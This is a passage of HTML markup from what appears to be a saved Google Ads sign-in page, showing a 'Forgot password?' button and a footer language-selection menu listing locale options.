                      <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true">
                        <button
                          class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
                          jscontroller="soHxf"
                          jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                          data-idom-class="ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
                          jsname="LgbsSe"
                          type="button"
                        >
                          <div class="VfPpkd-Jh9lGc"></div>
                          <div class="VfPpkd-J1Ukfc-LhBDec"></div>
                          <div class="VfPpkd-RLmnJb"></div>
                          <span jsname="V67aGc" class="VfPpkd-vQzf8d">Forgot password?</span>
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <c-data id="c4" jsdata=" SnOFNc;_;$2 tEzfhe;_;$3 Rf8b0c;_;$4 VY6Opb;_;$5"></c-data><view-header style="display: none;"><title>Google Ads - Sign in</title></view-header>
          </c-wiz>
        </div>
      </div>
      <div class="wmGw4">
        <c-wiz jsrenderer="ZdRp7e" jsshadow="" jsdata="deferred-i1" data-node-index="0;0" jsmodel="hc6Ubd" c-wiz="">
          <footer class="FZfKCe">
            <div class="eXa0v" jscontroller="xiZRqc" jsaction="rcuQ6b:npT2md;OmFrlf:VPRXbd">
              <div jsshadow="" class="O1htCb-H9tDt" jsname="rfCUpd" jscontroller="yRXbo" jsaction="bITzcd:KRVFmb;iFFCZc:Y0y4c;Rld2oe:gDkf4c;EDR5Je:QdOKJc;FzgWvd:RFVo1b">
                <div jsname="wSASue" class="VfPpkd-O1htCb VfPpkd-O1htCb-OWXEXe-INsAgc VfPpkd-O1htCb-OWXEXe-di8rgd-V67aGc ReCbLb UAQDDf dEoyBf">
                  <div
                    class="VfPpkd-TkwUic"
                    jsname="oYxtQd"
                    jsaction="focus:AHmuwe; blur:O22p3e; click:cOuCgd; keydown:I481le; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd;"
                    aria-autocomplete="none"
                    role="combobox"
                    tabindex="0"
                    aria-haspopup="listbox"
                    aria-expanded="false"
                    aria-labelledby=" i2"
                    aria-controls="i3"
                    aria-describedby=""
                    aria-live="polite"
                    aria-disabled="false"
                  >
                    <span jscontroller="bTi8wc" class="VfPpkd-NSFCdd-i5vt6e VfPpkd-NSFCdd-i5vt6e-OWXEXe-NSFCdd VfPpkd-NSFCdd-i5vt6e-OWXEXe-di8rgd-V67aGc" jsname="B9mpmd">
                      <span class="VfPpkd-NSFCdd-Brv4Fb"></span><span class="VfPpkd-NSFCdd-MpmGFe"></span>
                    </span>
                    <span class="VfPpkd-uusGie-fmcmS-haAclf" aria-hidden="true"><span id="i2" class="VfPpkd-uusGie-fmcmS" jsname="Fb0Bif" aria-label="">English (United States)</span></span>
                    <span class="VfPpkd-t08AT-Bz112c">
                      <svg class="VfPpkd-t08AT-Bz112c-Bd00G" viewBox="7 10 10 5" focusable="false">
                        <polygon class="VfPpkd-t08AT-Bz112c-mt1Mkb" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon>
                        <polygon class="VfPpkd-t08AT-Bz112c-auswjd" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon>
                      </svg>
                    </span>
                    <span id="i3" style="display: none;" aria-hidden="true" role="listbox"></span>
                    <div class="VfPpkd-aPP78e"></div>
                  </div>
                  <div
                    class="VfPpkd-xl07Ob-XxIAqe VfPpkd-xl07Ob-XxIAqe-OWXEXe-tsQazb VfPpkd-xl07Ob VfPpkd-YPmvEd s8kOBc dmaMHc"
                    jsname="xl07Ob"
                    jscontroller="ywOR5c"
                    jsaction="keydown:I481le;JIbuQc:j697N(rymPhb);XVaHYd:c9v4Fb(rymPhb);Oyo5M:b5fzT(rymPhb);DimkCe:TQSy7b(rymPhb);m0LGSd:fAWgXe(rymPhb);WAiFGd:kVJJuc(rymPhb);"
                    data-is-hoisted="false"
                    data-should-flip-corner-horizontally="false"
                    data-stay-in-viewport="false"
                    data-menu-uid="ucj-1"
                  >
                    <ul
                      class="VfPpkd-rymPhb r6B9Fd bwNLcf P2Hi5d VfPpkd-OJnkse"
                      jsname="rymPhb"
                      jscontroller="PHUIyb"
                      jsaction="mouseleave:JywGue; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; keydown:I481le;"
                      role="listbox"
                      tabindex="-1"
                      aria-label="Change language"
                      data-evolution="true"
                      data-disable-idom="true"
                    >
                      <span class="VfPpkd-BFbNVe-bF1uUb NZp2ef" aria-hidden="true"></span>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="af"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Afrikaans</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="az"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">azərbaycan</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="bs"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">bosanski</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ca"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">català</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="cs"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Čeština</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="cy"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Cymraeg</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="da"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Dansk</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="de"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Deutsch</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="et"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">eesti</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="en-GB"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span>
                        <span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">English (United Kingdom)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-gk6SMd VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="true"
                        tabindex="-1"
                        data-value="en-US"
                        data-708c49e2-dcf0-4d62-b457-88577bfe3081="English (United States)"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span>
                        <span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">English (United States)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="es-ES"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Español (España)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="es-419"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span>
                        <span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Español (Latinoamérica)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="eu"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">euskara</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="fil"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Filipino</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="fr-CA"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Français (Canada)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="fr-FR"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Français (France)</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="ga"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Gaeilge</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="gl"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">galego</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="hr"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Hrvatski</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="id"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Indonesia</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="zu"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">isiZulu</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="is"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">íslenska</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="it"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Italiano</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="sw"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">Kiswahili</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
                        tabindex="-1"
                        data-value="lv"
                      >
                        <span class="VfPpkd-rymPhb-pZXsl"></span><span class="VfPpkd-rymPhb-Zmlebc-LhBDec"></span><span class="VfPpkd-rymPhb-Gtdoyb"><span class="VfPpkd-rymPhb-fpDzbe-fmcmS" jsname="K4r5Ff">latviešu</span></span>
                      </li>
                      <li
                        class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
                        jsaction=" keydown:RDtNu; keyup:JdS61c; click:o6ZaF; mousedown:teoBgf; mouseup:NZPHBc; mouseleave:xq3APb; touchstart:jJiBRc; touchmove:kZeBdd; touchend:VfAz8;focusin:MeMJlc; focusout:bkTmIf;mouseenter:SKyDAe; change:uOgbud;"
                        role="option"
                        aria-selected="false"
